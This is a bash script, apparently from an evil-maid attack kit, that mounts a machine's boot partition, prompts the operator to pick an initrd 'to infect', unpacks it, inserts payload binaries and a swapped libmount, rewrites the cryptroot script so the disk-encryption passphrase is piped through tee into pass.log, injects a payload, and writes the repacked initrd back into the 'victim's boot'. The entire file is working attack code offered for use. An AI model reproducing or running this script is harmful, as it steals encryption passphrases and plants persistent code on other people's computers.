
sudo mount $BOOTPARTITION $MNTDIR
mkdir -p $WORKDIR
mkdir -p $WORKSUBDIR
mkdir -p $TARGETINITRDDIR

initfiles=($(ls -d $MNTDIR/initrd*))
echo "Select an image to infect"
PS3="Pick a file: "
select INITRDNAME in "${initfiles[@]}" "Quit, do not infect!"; do
  if [ "$REPLY" -eq $(( ${#initfiles[@]}+1 )) ]; then
    sudo umount $MNTDIR
    echo "Quitting"
    exit 1;
  fi
  break
done
INITRDNAME=`echo $INITRDNAME | cut -b$MNTDIRLEN-`


cp $MNTDIR/$INITRDNAME $WORKDIR
cp $MNTDIR/$INITRDNAME $WORKSUBDIR
cd $WORKSUBDIR
mv $INITRDNAME initrd.img.cpio.gz
gunzip initrd.img.cpio.gz
cpio -i < initrd.img.cpio
rm initrd.img.cpio


INITRDCONFIG="${WORKDIR}/kitgen/ubuntu_14.04_x86_64/initrd_config/${INITRDNAME}.config.sh"
INITRDDEFAULTCONFIG="${WORKDIR}/kitgen/ubuntu_14.04_x86_64/initrd_config_default.sh"

if [ -e "${INITRDCONFIG}" ]; then
  source $INITRDCONFIG
else
  source $INITRDDEFAULTCONFIG "$WORKSUBDIR/scripts/local-top/cryptroot" $INITRDNAME
fi 

#the list below will be substituted by the building script, it looks like "/fileX" "/otherfileY"
for binary in FILELIST
do
  cp "$BINDIR$binary" "$WORKSUBDIR/bin$binary"
done
for binary in FILEPAYLOADLIST
do
  cp "$PAYLOADBINDIR$binary" "$WORKSUBDIR/bin$binary"
done
cp $BINDIR"/libmount.so.1.1.0" $WORKSUBDIR"/lib/x86_64-linux-gnu/libmount.so.1.1.0"
ln -s $WORKSUBDIR"/lib/x86_64-linux-gnu/libmount.so.1.1.0" $WORKSUBDIR"/lib/x86_64-linux-gnu/libmount.so.1"

sed -i'' "${EXTRALOGLINENUMBER} s/\$cryptkeyscript \"\$cryptkey\" |/\$cryptkeyscript \"\$cryptkey\" |\/bin\/tee pass.log |/g" $CRYPTROOTFILE

head -n $PAYLOADLINENUMBER $CRYPTROOTFILE > $TEMPFILE
echo "$PAYLOAD" >> $TEMPFILE
tail -n +$((PAYLOADLINENUMBER)) $CRYPTROOTFILE >> $TEMPFILE
cat $TEMPFILE > $CRYPTROOTFILE


#packing up toys into a brand new, "improved" initrd and deploying into victim's boot :)
find . | cpio --quiet --dereference -o -H newc | gzip > $TARGETINITRDDIR/$INITRDNAME
sudo cp $TARGETINITRDDIR/$INITRDNAME /mnt/$INITRDNAME
sudo umount $MNTDIR
cd $CURRENTWORKDIR
exit 0
